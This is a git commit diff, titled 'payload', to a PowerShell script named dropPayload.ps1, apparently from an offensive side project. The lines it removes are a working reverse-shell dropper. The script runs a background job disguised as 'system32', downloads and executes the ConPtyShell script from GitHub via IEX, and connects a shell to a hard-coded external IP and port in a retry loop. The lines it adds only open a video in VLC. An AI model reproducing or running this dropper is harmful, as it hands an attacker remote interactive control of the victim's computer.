85a75f8d0cd53db1544f0047a8245119a1235027
currone <94299594+snackmasta@users.noreply.github.com>
2024-02-02 09:05:37 +0700

    payload

--- side-project/dropPayload.ps1
+++ side-project/dropPayload.ps1
@@ -1,31 +1,6 @@
-# Function to start the job
-function Start-System32Job {
-    $job = Start-Job -Name "system32" -ScriptBlock {
-        # Your job script goes @"
-        IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing) 
-        Invoke-ConPtyShell 18.141.129.246 16976
-    }
+# Specify the paths to VLC and the video file
+$vlcPath = "C:\Program Files (x86)\VideoLAN\VLC\vlc.exe"
+$videoPath = "C:\Users\Legion\Videos\Sousou-18-720p-Btsite.mkv"
 
-    return $job
-}
-
-# Start the job loop
-do {
-    # Start the job
-    $job = Start-System32Job
-
-    # Wait for 10 seconds
-    Start-Sleep -Seconds 10
-
-    # Check if the job is still running
-    if ($job.State -eq 'Running') {
-        Write-Host "Job is running for more than 10 seconds. Stopping the loop."
-        
-        # Stop the loop
-        break
-    }
-
-    # Remove the completed job
-    Remove-Job -Name "system32" -Force
-
-} while ($true)
+# Start VLC with the specified video in fullscreen mode
+Start-Process -FilePath $vlcPath -ArgumentList "--fullscreen", $videoPath
